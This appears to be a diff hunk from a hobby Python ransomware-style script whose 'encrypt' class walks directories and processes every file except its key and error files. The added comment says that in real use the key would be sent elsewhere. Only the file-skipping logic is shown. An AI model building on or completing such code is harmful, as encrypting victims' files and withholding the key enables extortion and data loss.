@@ -88,7 +88,7 @@ class encrypt(object):
             #     for name in files:
             #         f.write(os.path.join(root,name)+'\n')
             for name in files:
-                if name!='keyfile.txt':
+                if name!='keyfile.txt' and name!='errorfile.txt': #ON REALWORLD I WOULD SEND KEY AND ERROR SOMEWHEREELSE 
                     walkingdir = os.path.join(root,name)
                     #   use try block here with with block
                     try:
